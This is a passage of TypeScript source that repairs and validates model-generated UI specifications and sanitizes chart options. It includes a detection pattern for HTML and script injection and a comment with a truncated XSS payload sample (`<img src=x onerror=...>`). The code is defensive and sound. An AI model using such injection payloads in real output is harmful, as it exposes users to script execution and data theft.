    const size = o === undefined ? undefined : num(o.size, -1e6, 1e6) ?? tuple3(o.size)
    out.push({
      shape,
      ...opt('color', o === undefined ? undefined : color(o.color)),
      ...opt('position', o === undefined ? undefined : tuple3(o.position)),
      ...opt('rotation', o === undefined ? undefined : tuple3(o.rotation)),
      ...opt('scale', scale),
      ...opt('size', size),
    })
  }
  return out
}

function tuple3(v: unknown): [number, number, number] | undefined {
  if (!Array.isArray(v) || v.length !== 3) return undefined
  const [a, b, c] = v
  if (typeof a !== 'number' || !Number.isFinite(a) || typeof b !== 'number' || !Number.isFinite(b)
    || typeof c !== 'number' || !Number.isFinite(c)) return undefined
  return [Math.min(1e6, Math.max(-1e6, a)), Math.min(1e6, Math.max(-1e6, b)), Math.min(1e6, Math.max(-1e6, c))]
}

/* ---------------- diagram (editorial) sub-repairers ---------------- */

/** Clamp a coordinate/size to the 4px editorial grid. */
function grid4(v: number, min: number, max: number): number {
  return Math.min(max, Math.max(min, Math.round(v / 4) * 4))
}

function repairDiagramNodes(v: unknown): GenuiDiagram['nodes'] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiDiagram['nodes'] = []
  const seen = new Set<string>()
  for (const raw of v) {
    if (out.length >= GENUI_LIMITS.maxDiagramNodes) break
    const o = obj(raw)
    if (o === undefined) continue
    const id = str(o.id, 128)
    const label = str(o.label, GENUI_LIMITS.maxString)
    if (id === undefined || label === undefined) continue
    if (seen.has(id)) continue
    seen.add(id)
    const nodeType = enu(o.type, DIAGRAM_NODE_TYPES)
    // Coordinate fields are clamped to a sane canvas and rounded to 4px.
    const x = o.x === undefined ? undefined : grid4(num(o.x, -1e6, 1e6) ?? 0, 0, 1e6)
    const y = o.y === undefined ? undefined : grid4(num(o.y, -1e6, 1e6) ?? 0, 0, 1e6)
    const w = o.w === undefined ? undefined : grid4(num(o.w, -1e6, 1e6) ?? 96, 40, 2000)
    const h = o.h === undefined ? undefined : grid4(num(o.h, -1e6, 1e6) ?? 48, 24, 1200)
    out.push({
      id, label,
      ...opt('sub', str(o.sub, 256)),
      ...opt('type', nodeType),
      ...opt('x', x),
      ...opt('y', y),
      ...opt('w', w),
      ...opt('h', h),
      ...opt('tag', str(o.tag, 32)),
    })
  }
  return out
}

function repairDiagramEdges(v: unknown): GenuiDiagram['edges'] | undefined {
  if (v === undefined) return []
  if (!Array.isArray(v)) return undefined
  const out: GenuiDiagram['edges'] = []
  for (const raw of v) {
    if (out.length >= GENUI_LIMITS.maxDiagramEdges) break
    const o = obj(raw)
    if (o === undefined) continue
    const from = str(o.from, 128)
    const to = str(o.to, 128)
    if (from === undefined || to === undefined) continue
    out.push({
      from, to,
      ...opt('label', str(o.label, GENUI_LIMITS.maxDiagramLabel)),
      ...opt('kind', enu(o.kind, DIAGRAM_EDGE_KINDS)),
      ...opt('route', enu(o.route, DIAGRAM_ROUTES)),
    })
  }
  return out
}

function repairDiagramTheme(v: unknown): GenuiDiagramTheme | undefined {
  const o = obj(v)
  if (o === undefined) return undefined
  const out: GenuiDiagramTheme = {}
  for (const key of ['paper', 'paper-2', 'ink', 'muted', 'soft', 'rule', 'accent', 'accent-tint', 'link'] as const) {
    const c = color(o[key])
    if (c !== undefined) out[key] = c
  }
  return Object.keys(out).length === 0 ? undefined : out
}

function repairDiagramZones(v: unknown): GenuiDiagram['zones'] | undefined {
  if (v === undefined) return []
  if (!Array.isArray(v)) return undefined
  const out: GenuiDiagram['zones'] = []
  for (const raw of v) {
    if (out.length >= GENUI_LIMITS.maxDiagramZones) break
    const o = obj(raw)
    if (o === undefined) continue
    const label = str(o.label, 64)
    if (label === undefined) continue
    out.push({
      label,
      ...opt('x', o.x === undefined ? undefined : grid4(num(o.x, -1e6, 1e6) ?? 0, 0, 1e6)),
      ...opt('y', o.y === undefined ? undefined : grid4(num(o.y, -1e6, 1e6) ?? 0, 0, 1e6)),
      ...opt('w', o.w === undefined ? undefined : grid4(num(o.w, -1e6, 1e6) ?? 100, 40, 2000)),
      ...opt('h', o.h === undefined ? undefined : grid4(num(o.h, -1e6, 1e6) ?? 100, 40, 1200)),
    })
  }
  return out
}

function repairDiagram(v: unknown): GenuiDiagram | null {
  const o = obj(v)
  if (o === undefined) return null
  const kind = enu(o.kind, DIAGRAM_KINDS as unknown as readonly GenuiDiagramKind[])
  if (kind === undefined) return null
  const nodes = repairDiagramNodes(o.nodes)
  if (nodes === undefined) return null
  const edges = repairDiagramEdges(o.edges)
  if (edges === undefined) return null
  const zones = repairDiagramZones(o.zones)
  if (zones === undefined) return null
  return {
    type: 'diagram', kind, nodes, edges, zones,
    ...opt('variant', enu(o.variant, DIAGRAM_VARIANTS)),
    ...opt('title', str(o.title, 256)),
    ...opt('theme', repairDiagramTheme(o.theme)),
  }
}

function repairTimeline(v: unknown, cap: number): Array<{ title: string; desc?: string; time?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ title: string; desc?: string; time?: string }> = []
  for (const item of v) {
    if (out.length >= cap) break
    const o = obj(item)
    const title = o === undefined ? undefined : str(o.title, 256)
    if (title === undefined) continue
    out.push({
      title,
      ...opt('desc', o === undefined ? undefined : str(o.desc, GENUI_LIMITS.maxString)),
      ...opt('time', o === undefined ? undefined : str(o.time, 128)),
    })
  }
  return out
}

function repairTree(v: unknown, cap: number): GenuiFileTreeNode[] | undefined {
  // Recursion is bounded by GENUI_LIMITS.maxTreeDepth (see the inner walk).
  return walkTree(v, cap, GENUI_LIMITS.maxTreeDepth)
}

function walkTree(v: unknown, cap: number, depthLeft: number): GenuiFileTreeNode[] | undefined {
  if (!Array.isArray(v)) return undefined
  const out: GenuiFileTreeNode[] = []
  for (const item of v) {
    if (out.length >= cap) break
    const o = obj(item)
    const name = o === undefined ? undefined : str(o.name, 256)
    if (name === undefined) continue
    const children = o !== undefined && depthLeft > 0 && Array.isArray(o.children) ? walkTree(o.children, cap, depthLeft - 1) : undefined
    out.push({ name, ...opt('type', o === undefined ? undefined : enu(o.type, FILE_TYPES)), ...opt('children', children) })
  }
  return out
}

function repairQuizOptions(v: unknown, answer?: unknown): Array<{ label: string; correct?: boolean; feedback?: string }> | undefined {
  if (!Array.isArray(v)) return undefined
  const out: Array<{ label: string; correct?: boolean; feedback?: string }> = []
  for (const optItem of v) {
    if (out.length >= GENUI_LIMITS.maxQuizOptions) break
    const o = obj(optItem)
    const label = typeof optItem === 'string' ? str(optItem, 512) : o === undefined ? undefined : str(o.label, 512)
    if (label === undefined) continue
    out.push({
      label,
      ...opt('correct', o === undefined ? undefined : o.correct === true ? true : undefined),
      ...opt('feedback', o === undefined ? undefined : str(o.feedback, GENUI_LIMITS.maxString)),
    })
  }
  // Nothing recoverable (empty array, all-non-string non-object items): return
  // undefined rather than an empty list, so repairNode drops the whole quiz
  // instead of half-rendering a question with no options — the same
  // silently-unusable state the string-options case produces when kept.
  if (out.length === 0) return undefined

  // The canonical quiz shape stores correctness on each option. Models
  // commonly emit the simpler { options: string[], answer } form; only
  // use that alias when no canonical correct marker was supplied.
  if (out.some(option => option.correct === true)) return out
  const answerIndex = typeof answer === 'number' && Number.isFinite(answer)
    ? Math.trunc(answer)
    : typeof answer === 'string'
      ? out.findIndex(option => option.label === answer.slice(0, 512))
      : -1
  if (answerIndex < 0 || answerIndex >= out.length) return out
  return out.map((option, index) => index === answerIndex ? { ...option, correct: true } : option)
}

/**
 * Patterns that indicate HTML/script injection in a string field. ECharts
 * default `tooltip.renderMode: 'html'` writes tooltip content via
 * `innerHTML`; even with renderMode forced to 'richText' (see below),
 * filtering these patterns is defense-in-depth — a model (or a
 * prompt-injected model) should never emit `<script>`, `onerror=`, or
 * `javascript:` inside a chart option string.
 */
const ECHART_HTML_DANGER_RE = /<(?:script|img|svg|iframe|video|audio|object|embed|source)\b|on[a-z]+\s*=|javascript:/i

/**
 * Mutable budget counter for the sanitize walk — passed by reference so
 * every recursion shares one pool.
 */
interface EChartSanitizeBudget { count: number }

/**
 * Sanitize an ECharts option object: depth-bounded, budget-bounded
 * pass-through that strips dangerous values (functions, `url()` in styles,
 * HTML/script injection patterns in strings) but preserves the object shape
 * ECharts needs. Scalars are KEPT: ECharts options are full of them,
 * including inside `data` arrays (`data: [120, 150, 180]`,
 * `xAxis.data: ['1月', '2月']`). Previously a scalar hit the plain-object
 * gate below and returned undefined, so every primitive-valued array was
 * filtered to empty and dropped — a chart with a full `option` rendered
 * with empty series (blank canvas). This is a safety walk, not an ECharts
 * semantic validator.
 *
 * Security: `tooltip.renderMode` is forced to `'richText'` on every tooltip
 * object. ECharts' default `'html'` mode writes tooltip content via
 * `innerHTML`, which is an XSS vector when the option originates from model
 * output — a prompt-injected model could emit
 * `{"tooltip":{"formatter":"<img src=x onerror=...>"}}` and execute
 * arbitrary script. `richText` renders as text, never touching innerHTML.
 */
function sanitizeEChartOption(v: unknown, depth: number, budget: EChartSanitizeBudget): unknown {
  if (budget.count <= 0) return undefined
  budget.count -= 1
  if (depth > GENUI_LIMITS.maxEChartOptionDepth) return undefined
  // Scalars pass through: numbers/strings/booleans/null are legal ECharts
  // values both as object fields and as array elements.
  if (typeof v === 'string') {
    const s = v.slice(0, GENUI_LIMITS.maxString)
    // Reject strings containing HTML/script injection patterns or CSS url()
    // (exfiltration channel). Preserves legitimate ECharts string values
    // (labels, plain-text formatter templates, etc.).
    if (s.toLowerCase().includes('url(') || ECHART_HTML_DANGER_RE.test(s)) return undefined
    return s
  }
  if (typeof v === 'number' && Number.isFinite(v)) return v
  if (typeof v === 'boolean') return v
  if (v === null) return null
  if (Array.isArray(v)) {
    const cap = Math.min(v.length, GENUI_LIMITS.maxEChartArrayLen)
    const arr: unknown[] = []
    for (let i = 0; i < cap; i++) {
      const s = sanitizeEChartOption(v[i], depth + 1, budget)
      if (s !== undefined) arr.push(s)
    }
    return arr.length > 0 ? arr : undefined
  }
  const o = obj(v)
  if (o === undefined) return undefined
  const out: Record<string, unknown> = {}
  for (const [key, val] of Object.entries(o)) {
    const s = sanitizeEChartOption(val, depth + 1, budget)
    if (s === undefined) continue
    // Force tooltip.renderMode: 'richText' to prevent ECharts from writing
    // tooltip content via innerHTML (the default 'html' mode is an XSS
    // vector when the option comes from model output).
    if (key === 'tooltip' && typeof s === 'object' && s !== null && !Array.isArray(s)) {
      (s as Record<string, unknown>).renderMode = 'richText'
    }
    out[key] = s
  }
  return Object.keys(out).length > 0 ? out : undefined
}

/**
 * Deterministically repair a raw spec value into a renderable GenuiSpec.
 * Returns null only when the root is not an object with an `items` array
 * (a bare component root is wrapped into a col first — the documented fence
 * vocabulary allows single-component bodies); every other defect is healed by
 * dropping/clamping/truncating. Idempotent: repairing a repaired spec is a
 * no-op.
 */
export function repairGenuiSpec(value: unknown): GenuiSpec | null {
  const v = obj(value)
  if (v === undefined) return null
  if (!Array.isArray(v.items)) {
    const wrapped = wrapSingleComponentRoot(value)
    if (wrapped === null) return null
    return repairGenuiSpec(wrapped)
  }
  const ctx: RepairCtx = { remaining: GENUI_LIMITS.maxNodes }
  return {
    ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
    ...opt('gap', num(v.gap, 0, 96)),
    ...opt('panel', v.panel === true ? true : undefined),
    ...opt('append', v.append === true ? true : undefined),
    items: repairItems(v.items, ctx, 0),
  }
}

/* ---------------- validation ---------------- */

/**
 * Count the nodes of a spec tree (every item, descending into tabs /
 * accordion / file-tree / list containers — the same descent
 * `validateGenuiSpec` walks). Shared by the panel fold (node-budget gate)
 * and validation, so the panel never runs a second, divergent traversal.
 * `cap` bounds the walk for hostile inputs; the panel passes
 * `PANEL_LIMITS.maxNodes + 1` to detect overflow without counting the whole
 * tree.
 */
export function countGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY): number {
  let count = 0
  const walk = (list: unknown): void => {
    if (!Array.isArray(list)) return
    for (const item of list) {
      if (count >= cap) return
      count += 1
      const v = obj(item)
      if (v === undefined) continue
      if (v.type === 'tabs' && Array.isArray(v.tabs)) {
        for (const t of v.tabs) {
          if (count >= cap) return
          const to = obj(t)
          if (to !== undefined) walk(to.items)
        }
      } else if (v.type === 'accordion' && Array.isArray(v.items)) {
        for (const it of v.items) {
          if (count >= cap) return
          const io = obj(it)
          if (io !== undefined) walk(io.items)
        }
      } else if ((v.type === 'row' || v.type === 'col' || v.type === 'grid' || v.type === 'card') && Array.isArray(v.items)) {
        // Layout containers hold real children; skipping them undercounted
        // the tree and hid silent drops from validate_dsh_ui (issue #42).
        walk(v.items)
      } else if (v.type === 'file-tree' && Array.isArray(v.items)) {
        walk(v.items)
      } else if (v.type === 'list' && Array.isArray(v.items)) {
        // Typed list children are nodes too (repair charges them against the
        // budget); strings and {title,desc} shapes are skipped.
        for (const li of v.items) {
          if (count >= cap) return
          const lo = obj(li)
          if (lo !== undefined && typeof lo.type === 'string') walk([lo])
        }
      }
    }
  }
  const root = obj(value)
  walk(root === undefined ? [] : root.items)
  return count
}

/** Every white-listed node `type`. Keep in sync with the repairNode switch —
 * validate_dsh_ui uses it to tell declared GenUI nodes apart from unrelated
 * `"type"` strings (e.g. file-tree's `{type:'file'}` children). */
export const GENUI_NODE_TYPES: ReadonlySet<string> = new Set([
  'accordion', 'audio', 'avatar', 'badge', 'breadcrumb', 'button', 'callout', 'card', 'chart',
  'checkbox', 'code', 'col', 'copy', 'diff', 'divider', 'file-tree', 'grid', 'image', 'input', 'json',
  'keyvalue', 'link', 'list', 'mermaid', 'plot', 'progress', 'quiz', 'radio', 'row', 'scene3d',
  'select', 'slider', 'spacer', 'stat', 'steps', 'submit', 'switch', 'table', 'tabs', 'text',
  'textarea', 'timeline', 'video', 'echart', 'diagram',
])

/**
 * Count DECLARED nodes in a raw spec tree: objects whose `type` is a
 * white-listed string, descending the same containers `countGenuiNodes`
 * walks. `validate_dsh_ui` compares this with the repaired count to surface
 * children the repair silently dropped (blank-render class of bugs, issue
 * #42) instead of reporting a green check on a half-empty tree.
 */
export function countDeclaredGenuiNodes(value: unknown, cap = Number.POSITIVE_INFINITY): number {
  let count = 0
  const declared = (candidate: unknown): boolean => {
    const o = obj(candidate)
    return o !== undefined && typeof o.type === 'string' && GENUI_NODE_TYPES.has(o.type)
  }
  const walk = (list: unknown): void => {
    if (!Array.isArray(list)) return
    for (const item of list) {
      if (count >= cap) return
      if (!declared(item)) continue
      count += 1
      const v = obj(item)
      if (v === undefined) continue
      if (v.type === 'tabs' && Array.isArray(v.tabs)) {
        for (const t of v.tabs) walkItemsOf(t)
      } else if (v.type === 'accordion' && Array.isArray(v.items)) {
        for (const it of v.items) walkItemsOf(it)
      } else if ((v.type === 'row' || v.type === 'col' || v.type === 'grid' || v.type === 'card') && Array.isArray(v.items)) {
        walk(v.items)
      } else if (v.type === 'list' && Array.isArray(v.items)) {
        for (const li of v.items) {
          if (declared(li)) walk([li])
        }
      }
    }
  }
  const walkItemsOf = (holder: unknown): void => {
    const o = obj(holder)
    if (o === undefined) return
    const items = o.items !== undefined ? o.items : o.content
    if (Array.isArray(items)) walk(items)
    else if (declared(items)) walk([items])
  }
  const root = obj(value)
  if (root === undefined) return count
  // Single-component root (no items array): the root itself is the declared node.
  if (!Array.isArray(root.items) && declared(value)) walk([value])
  else walk(root.items)
  return count
}

/**
 * Validate a raw spec value against the white list and limits, collecting
 * human-readable problems. Unlike repair this never mutates: it is a
 * diagnostic for tests and tooling. Unknown `type`s are reported (a plugin
 * custom type is valid only when a renderer is registered — the guard cannot
 * know, so it flags them as warnings).
 */
export function validateGenuiSpec(value: unknown): GenuiValidation {
  const errors: string[] = []
  const v = obj(value)
  if (v === undefined) return { ok: false, errors: ['spec root must be an object'] }
  if (!Array.isArray(v.items)) {
    // Single-component root: validate through the wrapped form so the tool
    // agrees with the renderer about what is a valid fence body.
    const wrapped = wrapSingleComponentRoot(value)
    if (wrapped !== null) return validateGenuiSpec(wrapped)
    return { ok: false, errors: ['spec.items must be an array'] }
  }
  if (v.title !== undefined && typeof v.title !== 'string') errors.push('spec.title must be a string')
  if (v.gap !== undefined && (typeof v.gap !== 'number' || !Number.isFinite(v.gap))) errors.push('spec.gap must be a finite number')
  let count = 0
  let capped = false
  const walk = (list: unknown, depth: number, path: string): void => {
    if (capped) return
    if (!Array.isArray(list)) {
      errors.push(`${path} must be an array`)
      return
    }
    for (let i = 0; i < list.length; i++) {
      if (capped || count >= GENUI_LIMITS.maxNodes) {
        if (!capped) {
          errors.push(`spec exceeds ${GENUI_LIMITS.maxNodes} nodes; tail elided`)
          capped = true
        }
        return
      }
      count += 1
      const at = `${path}[${i}]`
      validateNode(list[i], depth, at, errors, walk)
    }
  }
  walk(v.items, 0, 'items')
  return { ok: errors.length === 0, errors }
}

type Walker = (list: unknown, depth: number, path: string) => void

function validateNode(value: unknown, depth: number, at: string, errors: string[], walk: Walker): void {
  if (depth > GENUI_LIMITS.maxDepth) {
    errors.push(`${at}: exceeds max depth ${GENUI_LIMITS.maxDepth}`)
    return
  }
  const v = obj(value)
  if (v === undefined) {
    errors.push(`${at}: must be an object`)
    return
  }
  const type = v.type
  if (typeof type !== 'string') {
    errors.push(`${at}: missing string 'type'`)
    return
  }
  const isStr = (name: string): void => { if (v[name] !== undefined && typeof v[name] !== 'string') errors.push(`${at}: '${name}' must be a string`) }
  const isNum = (name: string): void => { if (v[name] !== undefined && (typeof v[name] !== 'number' || !Number.isFinite(v[name]))) errors.push(`${at}: '${name}' must be a finite number`) }
  switch (type) {
    case 'text':
      if (typeof v.content !== 'string' && typeof v.text !== 'string') {
        errors.push(`${at}: type 'text' requires content or text (string)`)
      }
      isStr('content')
      isStr('text')
      break
    case 'row': case 'col': case 'card': case 'grid':
      if (!Array.isArray(v.items)) errors.push(`${at}: type '${type}' requires items (array)`)
      walk(v.items, depth + 1, `${at}.items`)
      if (type === 'grid') isNum('cols')
      break
    case 'button': case 'checkbox': case 'link': case 'switch':
      if (typeof v.label !== 'string') errors.push(`${at}: type '${type}' requires label (string)`)
      isStr('label')
      break
    case 'image': case 'audio': case 'video':
      if (typeof v.src !== 'string') errors.push(`${at}: type '${type}' requires src (string)`)
      isStr('src')
      isStr('alt')
      if (type === 'video') isStr('poster')
      break
    case 'slider':
      isStr('label')
      isNum('min'); isNum('max'); isNum('step'); isNum('value')
      break
    case 'input': case 'textarea':
      isStr('label'); isStr('placeholder'); isStr('value')
      break
    case 'select': case 'radio':
      if (!Array.isArray(v.options)) errors.push(`${at}: type '${type}' requires options (array)`)
      break
    case 'submit':
      if (typeof v.label !== 'string') errors.push(`${at}: type 'submit' requires label (string)`)
      // action is optional (local grading needs no round trip); the
      // renderer disables the button when it is absent AND no question
      // carries local `answer` data.
      break
    case 'badge':
      if (typeof v.label !== 'string' && typeof v.text !== 'string' && typeof v.value !== 'string') {
        errors.push(`${at}: type 'badge' requires label, text, or value (string)`)
      }
      isStr('label')
      isStr('text')
      isStr('value')
      break
    case 'stat':
      if (typeof v.label !== 'string') errors.push(`${at}: type 'stat' requires label (string)`)
      if (typeof v.value !== 'string') errors.push(`${at}: type 'stat' requires value (string)`)
      isStr('delta')
      break
    case 'progress':
      if (typeof v.value !== 'number' || !Number.isFinite(v.value) || (v.value as number) < 0 || (v.value as number) > 100) {
        errors.push(`${at}: type 'progress' requires value (number 0..100)`)
      }
      isNum('value')
      break
    case 'avatar':
      if (typeof v.name !== 'string') errors.push(`${at}: type 'avatar' requires name (string)`)
      break
    case 'list':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'list' requires items (array)`)
      if (Array.isArray(v.items)) {
        // Descend into typed children so validation agrees with repair and
        // rendering (they recurse into list items as GenuiNodes). Strings and
        // {title,desc} list-item shapes are not nodes and are skipped.
        for (let i = 0; i < v.items.length; i++) {
          const item = obj(v.items[i])
          if (item !== undefined && typeof item.type === 'string') {
            validateNode(item, depth + 1, `${at}.items[${i}]`, errors, walk)
          }
        }
      }
      break
    case 'table':
      if (!Array.isArray(v.columns)) errors.push(`${at}: type 'table' requires columns (array)`)
      if (!Array.isArray(v.rows)) errors.push(`${at}: type 'table' requires rows (array)`)
      break
    case 'chart':
      if (!Array.isArray(v.data) && !Array.isArray(v.series)) errors.push(`${at}: type 'chart' requires data or series (array)`)
      break
    case 'tabs': {
      if (!Array.isArray(v.tabs)) errors.push(`${at}: type 'tabs' requires tabs (array)`)
      if (Array.isArray(v.tabs)) {
        for (let i = 0; i < v.tabs.length; i++) {
          const t = obj(v.tabs[i])
          if (t === undefined) { errors.push(`${at}.tabs[${i}] must be an object`); continue }
          if (typeof t.label !== 'string') errors.push(`${at}.tabs[${i}].label must be a string`)
          walk(t.items, depth + 1, `${at}.tabs[${i}].items`)
        }
      }
      break
    }
    case 'plot':
      if (!Array.isArray(v.series)) errors.push(`${at}: type 'plot' requires series (array)`)
      break
    case 'callout':
      if (typeof v.content !== 'string') errors.push(`${at}: type 'callout' requires content (string)`)
      break
    case 'steps':
      if (!Array.isArray(v.steps)) errors.push(`${at}: type 'steps' requires steps (array)`)
      break
    case 'keyvalue':
      if (!Array.isArray(v.pairs)) errors.push(`${at}: type 'keyvalue' requires pairs (array)`)
      break
    case 'diff':
      if (!Array.isArray(v.diffs)) errors.push(`${at}: type 'diff' requires diffs (array)`)
      break
    case 'json':
      if (!('value' in v)) errors.push(`${at}: type 'json' requires value`)
      break
    case 'code':
      if (typeof v.code !== 'string') errors.push(`${at}: type 'code' requires code (string)`)
      break
    case 'accordion':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'accordion' requires items (array)`)
      if (Array.isArray(v.items)) {
        for (let i = 0; i < v.items.length; i++) {
          const item = obj(v.items[i])
          if (item === undefined) { errors.push(`${at}.items[${i}] must be an object`); continue }
          if (typeof item.title !== 'string') errors.push(`${at}.items[${i}].title must be a string`)
          walk(item.items, depth + 1, `${at}.items[${i}].items`)
        }
      }
      break
    case 'copy':
      if (typeof v.text !== 'string') errors.push(`${at}: type 'copy' requires text (string)`)
      break
    case 'mermaid':
      if (typeof v.code !== 'string') errors.push(`${at}: type 'mermaid' requires code (string)`)
      break
    case 'scene3d':
      if (!Array.isArray(v.meshes)) errors.push(`${at}: type 'scene3d' requires meshes (array)`)
      break
    case 'timeline':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'timeline' requires items (array)`)
      break
    case 'file-tree':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'file-tree' requires items (array)`)
      break
    case 'breadcrumb':
      if (!Array.isArray(v.items)) errors.push(`${at}: type 'breadcrumb' requires items (array)`)
      break
    case 'quiz':
      if (typeof v.question !== 'string') errors.push(`${at}: type 'quiz' requires question (string)`)
      if (!Array.isArray(v.options)) errors.push(`${at}: type 'quiz' requires options (array)`)
      break
    case 'diagram':
      if (typeof v.kind !== 'string') errors.push(`${at}: type 'diagram' requires kind (string)`)
      if (!Array.isArray(v.nodes)) errors.push(`${at}: type 'diagram' requires nodes (array)`)
      if (v.edges !== undefined && !Array.isArray(v.edges)) errors.push(`${at}: type 'diagram' requires edges (array) when present`)
      break

    case 'echart':
      if (v.option === undefined && v.data === undefined && v.series === undefined) {
        errors.push(`${at}: type 'echart' requires option, data, or series`)
      }
      isNum('height')
      break
    default:
      // Unknown type: plugin-registered custom nodes are valid when a
      // renderer exists; the guard cannot know, so report as a warning.
      errors.push(`${at}: unknown type '${type}' (custom renderer?)`)
  }
}
